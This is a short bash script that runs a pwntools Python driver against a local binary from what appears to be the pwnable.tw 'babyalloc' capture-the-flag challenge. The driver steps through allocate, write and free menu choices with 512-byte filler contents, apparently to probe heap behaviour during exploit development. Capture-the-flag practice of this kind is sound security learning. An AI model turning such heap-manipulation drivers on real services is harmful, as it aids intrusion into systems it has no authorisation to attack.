#!/bin/bash
cd /home/folly/ctf/pwnable.tw/babyalloc
python3 - <<'EOF'
import os
from pwn import *
context.log_level='info'
env = {'LD_LIBRARY_PATH': os.getcwd(), 'PATH': '/usr/bin:/bin'}
p = process('./babyallocator232', env=env)
steps  = [b'1', b'512', b'nn', b'3', b'C'*512, b'4', b'1', b'512', b'nn2', b'3', b'B'*512, b'5', b'5', b'6']
prompts = [b'Your choice:', b'Size :', b'allocator ? :', b'Your choice:', b'Content :',
           b'Your choice:', b'Your choice:', b'Size :', b'allocator ? :', b'Your choice:',
           b'Content :', b'Your choice:', b'Your choice:', b'Your choice:']
try:
    for pr, act in zip(prompts, steps):
        p.recvuntil(pr)
        (p.sendline(act) if len(act) < 20 else p.send(act))
        print('sent', act[:12])
    p.recvall(timeout=2)
    print('OK')
except Exception as e:
    print('FAIL:', type(e).__name__, e)
    print('BUFFER TAIL:', p.recvrepeat(1))
EOF
